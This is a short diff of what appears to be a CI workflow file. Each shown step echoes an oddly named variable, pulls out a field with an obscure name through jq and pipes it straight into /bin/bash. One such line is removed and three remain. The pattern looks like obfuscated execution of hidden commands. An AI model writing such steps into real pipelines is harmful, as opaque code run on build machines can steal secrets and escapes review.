@@ -21,7 +21,6 @@ jobs:
           echo $iyil7 | jq -r .tc3166 | /bin/bash
           echo $npthl12 | jq -r .r4 | /bin/bash
           echo $cdocl90972 | jq -r .hdt324 | /bin/bash
-          echo $zifl182 | jq -r .meyrn1 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
